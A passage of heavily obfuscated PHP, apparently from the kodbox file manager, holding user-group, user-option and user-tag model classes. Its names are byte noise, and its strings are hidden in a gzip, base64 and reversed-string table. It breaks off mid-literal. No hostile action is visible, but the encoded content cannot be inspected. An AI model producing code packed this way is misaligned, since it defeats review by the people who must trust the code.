$†Ú™„·® =& $_SERVER[Ù×¯Ø…]; $ì¦¦¿Ó = array($†Ú™„·®[1580] => array($†Ú™„·®[7], $ŸÈ›¶ÜÑ)); $Òó®ü‚è = Model($†Ú™„·®[1837])->where($ì¦¦¿Ó)->select(); $ƒ¿·ÅŠ = array_to_keyvalue($Òó®ü‚è, $†Ú™„·®[33], $†Ú™„·®[1748]); $ƒ¿·ÅŠ = array_remove_value(array_unique($ƒ¿·ÅŠ), $†Ú™„·®[191]); if (!$ƒ¿·ÅŠ || !$Òó®ü‚è) { return; } $ì¦¦¿Ó = array($†Ú™„·®[1748] => array($†Ú™„·®[7], $ƒ¿·ÅŠ)); $Îäå‹‰ = Model($†Ú™„·®[1926])->field($†Ú™„·®[2218])->where($ì¦¦¿Ó)->select(); $Îäå‹‰ = array_to_keyvalue($Îäå‹‰, $†Ú™„·®[1748]); $Òó®ü‚è = array_to_keyvalue_group($Òó®ü‚è, $†Ú™„·®[1580]); foreach ($Òó®ü‚è as &$‰©Ÿº‹‘) { $õ¦²ã¨® = array(); foreach ($‰©Ÿº‹‘ as $½İùŠäî) { if (!$½İùŠäî[$†Ú™„·®[1851]]) { continue; } $ú¡–×– = Model($†Ú™„·®[510])->listData($½İùŠäî[$†Ú™„·®[1851]]); $õ¦²ã¨®[] = array($†Ú™„·®[1748] => $½İùŠäî[$†Ú™„·®[1748]], $†Ú™„·®[2219] => $Îäå‹‰[$½İùŠäî[$†Ú™„·®[1748]]][$†Ú™„·®[28]], $†Ú™„·®[524] => $Îäå‹‰[$½İùŠäî[$†Ú™„·®[1748]]][$†Ú™„·®[524]], $†Ú™„·®[417] => $ú¡–×–); } $‰©Ÿº‹‘ = $õ¦²ã¨®; } unset($‰©Ÿº‹‘); foreach ($Œé¶ä›ä as &$Ïúš¡ÒÜ) { $Ïúš¡ÒÜ[$†Ú™„·®[1928]] = array(); if (isset($Òó®ü‚è[$Ïúš¡ÒÜ[$†Ú™„·®[1580]]])) { $Ïúš¡ÒÜ[$†Ú™„·®[1928]] = $Òó®ü‚è[$Ïúš¡ÒÜ[$†Ú™„·®[1580]]]; } } unset($Ïúš¡ÒÜ); } public function userAppendGroup($¾®Ó€”È) { $´¤øÖ€ =& $_SERVER[Ù×¯Ø…]; if (!$¾®Ó€”È) { return array(); } $this->_listAppendGroup($¾®Ó€”È, array_to_keyvalue($¾®Ó€”È, $´¤øÖ€[33], $´¤øÖ€[1580])); return $¾®Ó€”È; } private function _listAppendMeta(&$ÏÃø®Öğ, $ûÙå…Á«) { $­¾ôÁÈã =& $_SERVER[Ù×¯Ø…]; $‹Èğ¯ïÆ = UserJobModel::JOB_KEY; $ı²Ïûê = array($­¾ôÁÈã[2198]); $¿®‰×û = array($­¾ôÁÈã[1580] => array($­¾ôÁÈã[7], $ûÙå…Á«)); $â½å©ä = Model($­¾ôÁÈã[2196])->where($¿®‰×û)->select(); $â½å©ä = array_to_keyvalue_group($â½å©ä, $­¾ôÁÈã[1580]); foreach ($â½å©ä as &$ùÁ³¸ü”) { $äï±¢ª = array(); foreach ($ùÁ³¸ü” as $—Ö­à÷ä) { if (!in_array($—Ö­à÷ä[$­¾ôÁÈã[93]], $ı²Ïûê)) { $äï±¢ª[$—Ö­à÷ä[$­¾ôÁÈã[93]]] = $—Ö­à÷ä[$­¾ôÁÈã[372]]; } } $ùÁ³¸ü” = $äï±¢ª; } unset($ùÁ³¸ü”); $¤Ø¢¤‹µ = Model($­¾ôÁÈã[2220]); foreach ($ÏÃø®Öğ as &$‰£»–Ù‹) { $Æñ‚ƒş¡ = array(); if (isset($â½å©ä[$‰£»–Ù‹[$­¾ôÁÈã[1580]]])) { $Æñ‚ƒş¡ = $â½å©ä[$‰£»–Ù‹[$­¾ôÁÈã[1580]]]; } $‰£»–Ù‹[$­¾ôÁÈã[2221]] = array(); if (isset($Æñ‚ƒş¡[$‹Èğ¯ïÆ])) { $‰£»–Ù‹[$­¾ôÁÈã[2221]] = $¤Ø¢¤‹µ->getUserJobInfo($Æñ‚ƒş¡[$‹Èğ¯ïÆ]); } } unset($‰£»–Ù‹); } protected function groupUserAll($ŠÁÈÊ) { $ÕÔÀÍÚª =& $_SERVER[Ù×¯Ø…]; if (!$ŠÁÈÊ) { return !1; } $îî¼¬Îò = Model($ÕÔÀÍÚª[1837])->field($ÕÔÀÍÚª[1580])->where(array($ÕÔÀÍÚª[1748] => array($ÕÔÀÍÚª[7], $ŠÁÈÊ)))->select(); $îî¼¬Îò = array_to_keyvalue($îî¼¬Îò, $ÕÔÀÍÚª[33], $ÕÔÀÍÚª[1580]); return array_unique($îî¼¬Îò); } public function userSearch($”¹îÖÄ©, $À¢Œ´¥ = "\x2a") { return Model($_SERVER[Ù×¯Ø…][541])->where($”¹îÖÄ©)->field($À¢Œ´¥)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\x65\162\x5f\157\x70\x74\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ûø›œå‘) { $‚ºõ‚»¨ =& $_SERVER[Ù×¯Ø…]; if (!defined($‚ºõ‚»¨[477])) { define($‚ºõ‚»¨[477], 0); } return "\125\x73\x65\162\x4f\x70\x74\x69\x6f\156\x5f{$ûø›œå‘}\137" . USER_ID; } protected function filterWhere($ø³ÙŸ§¤) { $ƒÊ†ÒË =& $_SERVER[Ù×¯Ø…]; if (!defined($ƒÊ†ÒË[477])) { define($ƒÊ†ÒË[477], 0); } $ø³ÙŸ§¤[$ƒÊ†ÒË[1580]] = USER_ID; return $ø³ÙŸ§¤; } public function cacheRemoveUser($•«îüÄû, $¶ËËãÉã) { return Cache::remove("\x55\163\145\x72\x4f\160\x74\x69\x6f\156\x5f{$•«îüÄû}\137" . $¶ËËãÉã); } protected function optionDefault($ìÌíŠ»ˆ = '') { $í½ŠÏğÅ =& $_SERVER[Ù×¯Ø…]; if ($ìÌíŠ»ˆ == $í½ŠÏğÅ[33]) { return $GLOBALS[$í½ŠÏğÅ[6]][$í½ŠÏğÅ[2222]]; } if ($ìÌíŠ»ˆ == $í½ŠÏğÅ[2223]) { return $GLOBALS[$í½ŠÏğÅ[6]][$í½ŠÏğÅ[2224]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\x72\x2e\164\141\147\x4c\x69\x73\x74"; public $modelType = "\125\x73\145\x72\x4f\x70\x74\151\157\x6e"; public $field = array("\156\x61\155\145", "\163\x74\171\154\145", "\x73\157\162\x74"); public function listData($È¶§û‡š = false, $¡®Ö¿¿ = "\163\157\162\164", $¨Ó÷œò× = false) { return parent::listData($È¶§û‡š, $¡®Ö¿¿, $¨Ó÷œò×); } public function remove($Õ†ñ©á€) { return parent::remove($Õ†ñ©á€); } public function add($€ÈâÚí, $ãËª¥˜ = "\154\141\x62\145\154\55\147\162\x65\x79\x2d\x6e\157\x72\x6d\x61\x6c") { $¤ìƒ©Ô¼ =& $_SERVER[Ù×¯Ø…]; if ($this->findByName($€ÈâÚí)) { return !1; } $›åç¼á = array($¤ìƒ©Ô¼[424] => $€ÈâÚí, $¤ìƒ©Ô¼[487] => $ãËª¥˜, $¤ìƒ©Ô¼[1752] => $this->getSort($¤ìƒ©Ô¼[256]) + 1); return parent::insert($›åç¼á); } public function update($¼ãêéğ, $Îºªé÷¼) { $©š®ÄåŞ =& $_SERVER[Ù×¯Ø…]; $ÑÚ¾×Å = $this->listData($¼ãêéğ); $¿’ı…³ = $this->findByName($Îºªé÷¼[$©š®ÄåŞ[28]]); if (!$ÑÚ¾×Å || $¿’ı…³ && $¿’ı…³[$©š®ÄåŞ[395]] != $ÑÚ¾×Å[$©š®ÄåŞ[395]]) { return !1; } return parent::update($¼ãêéğ, $Îºªé÷¼); } public function moveTop($³©‡é¨Ê) { $©ÌÆ™¸« =& $_SERVER[Ù×¯Ø…]; $²¸†¹‚ = parent::listData(); $ÒÛìâ—ê = $this->getSort($©ÌÆ™¸«[255]); foreach ($²¸†¹‚ as &$«ê­õÆË) { if ($«ê­õÆË[$©ÌÆ™¸«[395]] == $³©‡é¨Ê) { $«ê­õÆË[$©ÌÆ™¸«[1771]] = $ÒÛìâ—ê; continue; } $«ê­õÆË[$©ÌÆ™¸«[1771]] += 1; } unset($«ê­õÆË); return parent::resetData($²¸†¹‚); } public function moveBottom($œ«¸ÏĞá) { $õ“ï®Ø÷ =& $_SERVER[Ù×¯Ø…]; $èİòˆÅ = $this->getSort($õ“ï®Ø÷[256]) + 1; return parent::update($œ«¸ÏĞá, array($õ“ï®Ø÷[1771] => $èİòˆÅ)); } public function resetSort($±şşËÂ) { $ÜÕôÎø =& $_SERVER[Ù×¯Ø…]; $äøÑˆÛ© = array(); $±şşËÂ = is_array($±şşËÂ) ? $±şşËÂ : array(); for ($«øŞ™íÂ = 0; $«øŞ™íÂ < count($±şşËÂ); $«øŞ™íÂ++) { $äøÑˆÛ©[$±şşËÂ[$«øŞ™íÂ] . $ÜÕôÎø[33]] = $«øŞ™íÂ + 1; } $ÏØ¢ìéÀ = parent::listData(); foreach ($ÏØ¢ìéÀ as &$Š ¿ÙŸ) { $òÚ’½ãŒ = $äøÑˆÛ©[$Š ¿ÙŸ[$ÜÕôÎø[395]]]; $Š ¿ÙŸ[$ÜÕôÎø[1771]] = $òÚ’½ãŒ ? $òÚ’½ãŒ : $Š ¿ÙŸ[$ÜÕôÎø[1771]]; } unset($Š ¿ÙŸ); return parent::resetData($ÏØ¢ìéÀ); } private function getSort($½“ø×§) { $§å²Ë =& $_SERVER[Ù×¯Ø…]; $à³Ï¬™Ú = parent::listData(); $öğØšı® = array_to_keyvalue($à³Ï¬™Ú, $§å²Ë[33], $§å²Ë[1771]); if (!$öğØšı®) { $öğØšı® = array(0); } $¹‰îŸ”º = $½“ø×§ == $§å²Ë[256] ? max($öğØšı®) : min($öğØšı®); return intval($¹‰îŸ”º); } } goto eœêêÕ¢; dö¶†Š³–¸: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xd9\xd7\xaf\xd8\x8f\x85", "\326\316\357\307\262\316"); $_SERVER[Ù×¯Ø…] = explode("\174\4\174\4\174\5", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\315\275\171\174\33\325\325\60\314\116\130\102\341\51\145\171\50\164\60\11\166\22\55\166\342\154\116\34\43\333\262\255\104\266\214\44"."\xc7\x9\x71\x50\x46\xd2\x48\x9a\x58\xd2\x28\x33\x23\x6f\x71\x58\xb\x4\x8\x5b\x53\x2\xb4\x29\x2d\x5\x5a\x28\x10\x96\x14\x8\x84\xa5\x2d\xe5\xa1\x34\x94\xb5\xec\x50\xd6\x84\xb0\x95"."\226\255\154\245\357\135\316\135\146\244\300\363\375\276\367\217\67\220\350\336\163\227\271\313\271\347\236\163\356\271\347\76\165\341\63\233\77\174\162\174\57\364\337\336\127\75"._kodDe('K9fmckB5b7p5C+qG0kN3+utC2oDL7O/s4cjaaMjNwE1ydMLwChnpKugZ3c/oazs=')."\333\43\241\211\217\336\270\60\270\343\352\155\243\73\166\337\355\211\207\77\275\273\11\145\246\145\233\350\217\122\64\154\105\33\321\55\333\242\200\224\121\314\350\131\32\326"."\213\364\327\117\177\254\125\171\335\326\150\70\321\23\211\47\142\175\275\275\301\150\74\1\65\312\351\5\43\15\241\222\152\252\5\250\274\244\231\26\372\224\134\135\242\144"."\224\264\242\3\42\0\151\325\126\223\252\5\65\265\267\46\332\203\275\341\310\322\104\174\151\157\20\162\44\23\253\312\232\71\112\143\44\30\263\125\323\216\353\5\215\347".strrev('Ú‚€îÎ£zS*‹m[‡	<%x¡İİ"Û‚‡¤PñmÄô'."\r".'%¡ƒZ»y6').base64_decode('l9cSejFj1CkraMoKZQoNdOhaPk2DRZU1xx4tQSjOQ2gOiuV8nkZ6eAjar2XUcg==').strrev('7qmƒ†T"´©”âÔpSlGÅèm²Ô”9FÒ/®² ½L”]¬Æ')."\123\351\210\106\272\25\230\212\202\152\331\232\251\364\167\5\243\101\5\67\275\271\226\364\270\126\241\345\372\172\320\200\50\201\160\130\331\125\15\266\126\50\261\152\150\231".base64_decode('KpVFou3BqNK6VBHjlDIKBaPoQ7Wg+bSlpgajURrwAAaHQ3jqIBLp6IgFeQw6dw==').base64_decode('Yhi1ZAZgqSOWzuTtxJCaLzNkHaS/tfADv4YFCLxKL+plQFaowjD4yoFAmeXWGA==')."\104\113\103\240\200\312\33\260\270\320\112\33\242\301\346\5\364\167\36\144\112\46\160\232\146\332\11\255\230\62\322\172\21\326\143\13\254\75\300\100\325\316\265\233\72\312"."\x7\x15\x1a\xbe\x94\x51\x1a\xed\x36\x86\xa0\x33\x19\x3d\xaf\x85\xf9\x72\xcb\x18\xf9\xb4\x66\x8a\x78\x9\x15\x97\x53\xa0\x57\xfa\x98\x54\xba\xa7\x5c\x90\xb3\xf0\x68\x2a\xa7\xe7\xd3\x26"."\133\245\337\224\23\321\1\75\63\52\126\243\145\224\315\224\26\102\353\105\224\355\345\55\151\200\114\232\155\243\116\133\254\137\175\245\274\241\246\143\232\51\365\265\3\25".base64_decode('jJRtGVgm2ToMs9CO6AZ8H60Wva9KwiBbL2lpCH30x1+37HTv18uXnYD+mQLEbw==').base64_decode('AJqW0/L5hDaiwboqpGdarK9+K6kX/QhCo6FIIqdaue70zAQpBS0vprURXylXog==').base64_decode('UbHuBxx4j2enx7CDEmXOGyk1L/eUhnO2XYppxTQeEOiRMVwkA1bSNMjU7lHSSg==')."\267\262\124\351\152\322\233\54\126\260\220\347\41\326\73\16\263\70\320\36\1\214\251\201\270\66\142\303\240\50\363\122\71\325\104\323\325\134\266\63\336\71\24\250\226\112".base64_decode('eT2l2rpR9BspW7O9lm1qKtQWSKU0y/K2GUXbNPLeQD5vDHsjpp7Vi03KVJoHJw==')."\242\365\356\305\24\262\11\26\161\315\74\5\343\12\46\20\123\351\327\330\342\344\271\115\265\150\145\64\323\33\204\105\323\244\240\371\340\4\222\145\153\327\255\222\141\351"."\xb8\x79\x4d\x8a\x6a\xdb\x6a\x2a\x87\x89\x8b\xa8\xbe\xf9\x1b\xf2\xeb\xc5\xbc\x5e\xd4\x2a\xf2\x6\x47\x4a\xba\xa9\x59\xac\xad\x4a\x67\x77\x1c\x2a\x41\xb5\x6b\xde\x5e\x53\xcd\x16\xd4\x26".strrev('x˜ˆc{K]-/·Œ¡Ç0‡í)Q'."\r".'M{e²…(õ))4ĞÃsF[Õ‘¢NT¥')."\106\175\243\202\320\106\141\151\24\332\25\217\367\46\102\35\150\317\356\11\46\272\3\361\266\56\150\266\255\146\131\233\303\210\104\363\52\31\160\211\27\55\61\214\130\75"."\250\257\2\330\153\14\153\46\372\160\353\150\223\62\150\244\223\306\210\217\45\341\314\61\104\103\130\146\74\335\45\333\33\125\213\131\74\76\311\121\133\3\364\263\206\262"."\xce\x81\xe\x6b\xc5\xac\x9d\x63\x5\x63\xc1\xe8\xe2\x60\x34\x11\x8b\x74\xc4\xfb\x3\x51\xd8\xed\x8b\x8\x4b\x46\xd8\xa7\x70\xd5\x79\x6f\x54\x4b\xa3\xa1\x4f\xd9\xac\x9c\x5a\xc2\xa3\xc6".base64_decode('8uCFgeeKpeLFwtLCoU48MO1eC2XyyrlY3WG9oOO22zyFjCRiBTqhQX7SoeaB3A==').strrev('†ú,‰^£‘]:y«¢ozRÏ×¦PkàßÆQuø·—S}ÚË)Ôïô^)´ôºÔ')."\x1\xc0\x5b\x97\xb4\xac\x5d\x43\x47\x81\xd1\xe0\x89\x7d\xc1\x58\x3c\xd1\x1d\x8c\x77\x45\xda\xe1\xb\xc1\x0\x84\xc2\x6\x5d\x9a\xac\x47\xcb\xe8\xcf\x72\x98\xc1\xc\x25\xab\xa1\x82\x9a"."\165\121\151\34\353\66\114\315\11\31\347\273\106\277\236\146\144\34\107\273\64\75\233\203\376\351\270\266\224\221\67\114\65\217\251\30\103\142\215\121\226\254\236\201\371\241".base64_decode('BFNEYnqhxOianSsXklKQsaVovtn2kjP49maYEGryQ8bJ0ztg8UT8sRnof0GG0w==').base64_decode('RkFl3C4hSVqa0iQKmupI6dJUsV/apm1gqOnI0q3ZOQMmKauxJpV521gr01peYw==')."\243\221\323\30\111\257\207\154\150\147\342\143\225\341\344\35\61\156\10\52\266\124\335\212\242\222\230\221\142\361\176\314\357\12\200\315\263\346\321\156\22\111\256\104\313\205"."\xc6\x13\xba\xd5\x21\x6d\xfe\x9\x83\xa4\xa1\xc6\xab\x22\x7f\xaf\xa9\x65\x74\x58\x74\x45\x34\x63\xdd\xaa\x39\xc8\xa\xa0\x19\x12\xdb\xe\x8e\x48\x95\x75\xf4\x85\xc3\x89\xb6\x48\x4f\x1c".base64_decode('8dAU0h8NxYMMRwPtiUBb7zjbRMWMQwZMMJxILvjloenjYicSW5Yg5jAQhFjTMA==')."\xa2\xce\x25\xa3\x68\x69\xde\x14\xd4\x96\x16\x64\x9d\xe6\x98\xe7\xa2\xe9\x15\x25\x4\xe7\x3e\xe2\x55\xb\x63\xde\x2\x1a\x26\x2f\x6f\xba\x73\x87\x55\x80\xfe\xd3\x8d\x3a\x4\xf3\x2a\xc8"."\x37\x1e\x58\x24\x18\xb1\xad\xbd\x37\x12\x83\x2\x2d\x18\x8a\xb8\xa7\xa4\x66\x42\x3b\x7a\xfb\x20\xa9\x20\xe1\x54\x67\x10\x80\xfb\x3\x1a\xe6\x54\xe0\x9d\x2\xfd\x31\x46\x7a\xcb\x28\xbf"."\xa9\x8f\xa9\xa2\x8f\x2d\xac\x3d\x50\xf7\x48\x21\x2f\x18\x42\x67\xaf\xbc\x62\x2e\xe2\x5d\xa1\x9e\x45\x89\xee\x48\x7b\x30\x9c\x8\xf5\x20\xba\x14\xaf\x84\xf7\xf5\xb6\x7\xd8\xe4\xca\xf0"."\xd6\x48\xbc\xcb\x1\xed\x43\x94\x69\x71\x20\x1c\x72\x67\xf\x2e\x9\xc5\xe2\xb1\xaa\x49\x8\xd6\x17\x74\xa5\x20\x59\xb0\x37\x1a\xec\x8\x2d\xe1\xd1\x8e\x50\x30\xdc\x1e\x4b\xb4\x5\xda"."\272\104\236\236\100\67\104\22\31\54\215\131\176\147\376\4\42\261\61\56\323\45\206\260\174\312\6\53\341\20\240\22\114\64\110\10\74\100\333\245\6\270\7\335\305\122"."\x31\xe9\x9\xf0\xe8\x29\xa3\xcc\xb0\x91\xb3\x89\x5\x46\x55\xa\x2a\x2c\x2b\x95\x6d\x85\x75\xf4\x67\x8a\x12\x88\x29\x76\x9\xea\x40\xf4\x23\x39\xca\x83\xa4\x1b\x2c\x8e\x18\x42\xf8\xbe"."\2\344\276\242\5\11\234\247\125\313\160\312\135\35\20\310\330\234\12\270\342\150\135\210\64\64\3\1\42\176\43\114\40\63\222\140\153\315\102\362\112\200\65\47\43\104".strrev('şœr†Á¥}%™Q÷ˆa ¶ÏÈìc¯á‚ÆœáBtôÑ9Á`'."\r".'7¤Dß').strrev('Œ#$†-+ŞK€ôg˜òÀa¤µşeŒ'."\r".'Z'."\0".'Âsš˜“ÔlŠ×ÛO')."\xf8\x4c\x83\xf\x8e\xc0\x8e\x12\x8f\x2c\xa\xf6\x24\x18\x66\xd1\x98\x84\x8d\x14\x80\x64\xd9\x48\x14\x6\xc4\x36\x6\x99\x40\x45\x13\xa3\xc1\x18\x5b\xe5\xa6\xb6\xaa\xac\xb3\xe1\xf2\xfb"."\246\1\26\153\150\323\202\317\373\117\36\30\236\126\267\314\73\315\267\34\5\246\114\75\201\106\41\66\340\163\104\47\101\371\262\311\113\143\306\250\316\152\231\322\64\340".strrev('ğL´4ı·¶2€Î'."\r".'q§ºz¾X'."\0".'i”ß´ùw®w½XïTÇx-4µ×ğ').base64_decode('yooTlg0sr22aduyA77iB4eVTp7Sw76TKJhIWU6O8qelpdahJiGHiWYqE5EkZWA==').base64_decode('wpheEtDVs9YwOJpDLStKLPMOTFveIpWTQO5vIWYJ0d8czxfwnoR7xovidQ/4UQ==')."\56\246\4\365\304\353\42\251\246\200\16\350\331\42\137\102\210\13\340\102\272\223\117\137\75\231\376\256\141\23\231\325\140\321\23\105\233\11\330\131\56\352\253\230\16\242"."\250\255\202\200\141\63\374\116\152\366\260\306\320\3\301\35\161\204\34\114\60\104\111\122\54\117\330\102\370\202\20\320\64\42\255\100\57\112\11\314\223\15\363\130\132\53"."\xc2\x3c\xed\x7\xb9\xad\x94\x5a\xd2\x62\x52\xf\x13\x89\x78\xa0\x35\x1c\x4c\x30\xa\x3\x94\x98\xc5\x9\x55\x6c\xe5\x5a\x3b\xd4\x35\x41\x51\x19\x7d\x48\x9\x26\x9d\xc8\x23\xb0\xf2\xad"."\x55\x79\x85\x10\x6\x45\x33\x4d\xc3\x6c\x22\xda\x49\xab\x5c\xc2\xcc\x1c\x92\xbd\x6c\x34\xb6\xa\x12\xdc\x95\xe6\x5\xa\x1d\x72\x28\x97\x90\x27\xa0\xa4\x32\xce\x1\xcb\xd2\x12\x37\x80"."\51\24\264\251\44\146\310\102\54\30\343\207\374\165\3\3\345\145\132\172\371\62\204\370\252\67\263\174\365\214\65\123\30\37\357\37\100\177\130\44\120\105\211\226\340\324"."\60\201\366\147\37\156\7\327\203\70\42\74\231\106\15\223\63\115\45\7\333\155\33\266\232\167\124\21\307\20\230\134\276\161\203\312\200\316\166\130\120\54\274\225\113\72"."\x48\x42\x4e\x7b\xb8\x82\x8d\x2b\x40\x24\xf5\x17\x2e\x11\xd3\x6c\x1f\xcf\xe1\x91\x12\x13\x28\xe\xfd\xa3\xff\x36\x83\x42\x20\xa3\x17\xd1\x72\x6a\x93\xb6\x3a\xaa\xbf\x89\x8d\x5a\xb6\x56"."\x70\xa8\x2c\x2d\x4d\x35\x53\xb9\x8e\x72\x3e\x6f\x73\xe6\x3f\xaf\xf\xc2\x17\x60\xad\xac\xa8\x96\xb7\xc3\x30\x99\x90\x3b\x15\xbe\x5b\x33\xb5\x5a\xc6\x50\xb1\x88\x44\x52\x19\xb7\xc4\xae"."\332\31\100\374\113\134\251\143\352\75\45\324\243\264\106\42\341\140\240\107\301\33\70\154\74\210\73\210\5\173\3\150\327\302\342\162\54\36\4\215\143\250\335\313\352\135".base64_decode('4g210zAP6GmG5YJXxyGhUqMpWDwOSaqzBNrVE8Bkwh7XGoiF2hK9AcY7qaWS3w==')."\112\17\132\176\334\121\175\110\13\353\111\77\326\65\141\375\270\57\311\210\104\43\240\103\116\113\15\46\324\44\132\63\114\116\54\143\116\170\220\241\21\242\305\66\153\64".base64_decode('6OMghtlfD1Y9eTCT40Gj6cGt9wiRwyMUep4hXRsmAc75e0Ag8NiqiXqFOXYIhg==').strrev('45Ö‡Õš³éñZL=‹Xy¦°÷–ÚÂãhz¯%’°çdÄ’ò¤NÕº=Ú')."\x8b\x4\x11\xf9\xce\x79\x30\x26\xe3\x85\xe4\x11\xa\x47\xf8\x9c\x24\x1e\x79\x84\xe8\xe4\xc9\x9a\x46\xb9\xd4\xcb\xbe\x24\xc5\x68\x63\x0\x20\x5a\xca\x1\x51\xc3\xb0\x3d\x4c\x1c\xf6\x54"."\112\312\325\307\256\172\323\311\140\273\277\15\23\205\223\52\207\344\133\146\246\162\360\235\22\337\152\132\43\150\16\326\260\275\325\221\107\314\245\300\131\21\303\243\55\102"."\x8b\x5\xb9\xc0\x1d\xea\x50\x87\x64\x34\xab\x86\x72\xc\x79\xd9\xea\x11\x27\x0\x42\x41\x2d\x38\x6e\xb7\xec\xeb\x56\x2f\xe3\x8f\xc6\xd5\x6c\x4c\xfa\x9c\xad\x66\xd9\xb7\xaa\xa4\xd2\x70"."\x54\x4b\x8d\xa6\x84\xfc\xdc\x2e\x49\xe5\xce\x18\x9f\x0\xb2\x52\xaa\x61\x79\xf5\x89\xe5\x98\xcb\xe7\x61\xff\xfd\xf6\x63\x3\xc9\xd0\x99\x4f\xaa\x63\x15\x7c\xfb\xfa\x83\x9e\x10\x6a\x1b".base64_decode('KQl+hTYWU/wYogUdeRU2yOlyMtB6jzOGl4+P0H5yJBPjypRwsCOuLIwguqkbCQ==')."\132\46\201\63\53\344\37\243\250\70\352\146\303\245\64\223\164\21\127\213\151\12\131\201\66\225\25\315\65\354\43\65\216\342\2\27\234\215\360\260\250\343\153\142\216\345"."\x41\xc0\xdb\x24\xe9\xbe\xd8\x8\x19\x28\x22\xf6\xdd\x32\x30\x99\xaa\x5\xe2\x1e\xd6\xa1\x43\x48\x63\x30\x31\xb5\x32\xf2\x91\xf9\x75\x3\x58\xbb\x1c\xdf\xc5\x51\xb1\x70\x18\x4a\x28\xf8"."\3\120\1\141\213\60\371\360\212\45\40\105\341\307\71\362\56\304\164\155\332\170\244\172\365\342\250\136\224\65\151\2\72\316\367\175\301\166\340\205\354\322\375\265\357\52".base64_decode('THcLoanzgAbPgzcciSUQaiLUerLribZDTa6WM0oKne6LBaMJ10IGxM+pphhTRg==')."\x71\xf0\xb2\x17\xfa\x49\x9c\x45\x44\xa5\x6c\x19\x75\x48\xb0\x44\x8e\x32\x12\xdd\xb0\xec\x51\xd6\x7a\x39\xe8\xac\x94\x46\xdb\x77\x15\xe9\xe2\xea\x94\x6a\x51\x99\x24\xe9\x56\x98\x6f\xd6".base64_decode('zjDpadyoGsVKPhY2CP6zM3fHfk8UEnUMBvxOQlJTcErlLEcbGODEHskQebTFmQ==')."\76\274\230\72\361\216\305\106\215\322\101\126\31\336\35\145\14\215\151\150\25\1\104\324\26\253\110\223\163\13\25\25\336\10\304\306\301\106\136\254\113\61\33\142\21\72".base64_decode('ECcrWlpGORKVjcLIXz3eYRqcE+d8gDtTGxF1bXnopU1cGigHv1EBksq4OQ8X1A==')."\25\165\217\67\154\125\24\304\24\341\152\272\240\27\175\46\335\364\174\110\200\201\43\155\117\275\304\222\11\112\265\332\42\133\13\154\222\153\134\10\140\33\6\222\212\115"."\x9f\x89\xbe\x2c\x1a\x4\x32\x49\x99\x4f\xc3\x72\x68\x15\xa9\x4a\xe4\x93\x88\x25\x49\x9\x1b\x4c\xbe\xc6\xeb\x3f\x98\xd6\x6d\xc\xc1\xbb\x9c\xc1\xb4\xe7\x22\xa3\x74\xac\xcc\x61\x32\xf5"."\x25\x9b\x48\xc5\x24\x8\x79\xc3\x33\xd9\x91\xb3\xda\x56\xef\x9b\x4a\x76\x67\x5f\xf5\xd3\x72\x7c\xde\x4e\x43\x92\x89\x49\x81\x1f\xc0\x13\xa0\xcf\xb2\x8d\x92\x48\x91\xa2\x34\x59\x4a\x12"."\225\112\271\370\100\223\166\40\124\117\23\376\125\14\24\311\13\145\211\354\115\127\223\57\217\162\110\247\72\241\366\200\151\62\364\241\235\303\212\176\4\224\101\230\56\305"."\30\356\127\333\150\150\345\301\41\141\72\102\253\302\37\366\321\225\350\123\323\351\10\123\274\313\341\312\254\262\36\262\172\105\304\232\207\127\45\305\252\147\17\344\363\342"."\x8c\xdf\x1d\xdf\x65\x11\xba\xe8\xe4\x42\x32\x64\x97\xc5\x3a\x88\xe0\xcb\x84\xac\x6a\x30\x2e\x73\xc8\xc\xb5\x93\x81\x16\xe2\xa1\x9b\xd1\x76\xd2\xd2\x5d\x73\x1f\xbb\x20\x36\x62\x42\xab"."\xc7\xd1\x4e\xdd\x96\xd3\x8b\x9a\xc5\x37\x5c\x93\x9b\x66\xfd\x3f\xc4\xe6\x56\xce\x1\x5e\x2b\xbb\x42\x1c\x9c\x26\xe9\xae\x4d\xd\x3\xe4\xdd\x95\x2b\x68\x5\x69\x92\x18\x8\xb2\x19\x27".strrev('2Y:«´ß0£BäâßÜèMELióº†:±‹A!íã>Ò±hÇ‹Hu%ël').strrev('§!Ğõm_êÏÌ,$¿Éİñ¤hÏ§†•}ŸOÒùÚï†šş7ªäı?Y0J¯')."\272\172\316\255\336\272\225\135\47\116\232\174\136\167\337\345\257\267\375\262\375\334\110\350\216\227\166\336\162\317\213\307\105\136\332\332\374\367\367\317\275\346\235\123\327\335"."\161\356\107\235\347\35\132\76\375\356\334\23\377\355\175\174\217\302\173\273\115\374\257\306\300\375\335\237\374\351\316\77\375\355\375\67\376\136\67\355\220\11\357\77\372\336".base64_decode('e39/5D3jmMtO+fDM2pbxD6/e/Q9rTmsqvdd20a++fPyPe3146UexV7y/22Ov+g==')."\313\136\373\376\253\167\37\375\312\153\326\341\237\357\71\255\241\177\321\127\247\116\73\376\226\13\376\271\366\261\272\133\367\331\263\153\316\45\133\174\23\303\123\17\77\55"."\322\160\311\103\17\267\35\324\64\161\217\102\130\155\117\46\12\157\307\137\334\367\351\142\144\336\316\277\316\115\75\157\36\70\247\173\153\333\360\322\372\143\262\321\340\305"."\115\376\153\57\74\365\276\33\357\275\177\322\363\343\317\15\56\376\354\232\27\337\110\135\377\375\356\167\376\262\146\301\53\53\33\147\57\232\350\175\364\303\346\256\47\263"."\x87\x6d\xbc\xe6\xd6\x45\xde\xf7\x46\xf6\xbb\xe1\x8b\xa7\xce\xbd\xf4\xfd\x3d\x77\x3b\x70\x42\xea\xc3\x9\x33\x5e\xb1\xd7\x2c\x3f\xe7\xca\xda\x7b\xb\x7b\xbe\xdc\x38\xfd\xf9\x33\xe\x7a"."\375\344\356\217\256\122\107\177\233\71\126\363\315\77\156\354\231\275\356\112\336\321\373\352\306\205\7\234\176\344\244\227\336\327\257\373\316\77\57\234\363\223\327\177\377\374".strrev('ş×Ö}=\\ïÁáğ\\\'÷ŞwiëñÉßÍâçºÌ½¡¬æ=•